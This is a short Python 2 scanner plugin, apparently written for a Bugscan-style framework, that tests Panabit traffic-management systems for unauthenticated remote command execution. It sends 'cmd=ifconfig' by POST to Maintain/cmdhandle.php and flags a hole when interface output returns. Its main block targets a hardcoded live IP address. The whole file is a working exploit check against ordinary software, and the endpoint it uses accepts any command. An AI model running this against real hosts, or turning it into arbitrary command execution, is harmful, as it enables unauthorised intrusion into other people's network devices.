#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2015-0140998
import urlparse
def assign(service, arg):
    if service == "panabit":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'Maintain/cmdhandle.php'
    postdata = "cmd=ifconfig"
    code, head, res, errcode, _ = curl.curl2(url,post=postdata)
    if code==200 and 'netmask' in res and 'broadcast' in res and 'inet' in res:
        security_hole("Panabit某流量分析管理系统命令执行：post:cmd=命令")

if __name__ == '__main__':
    from dummy import *
    audit(assign('panabit', 'http://112.91.216.180/')[1])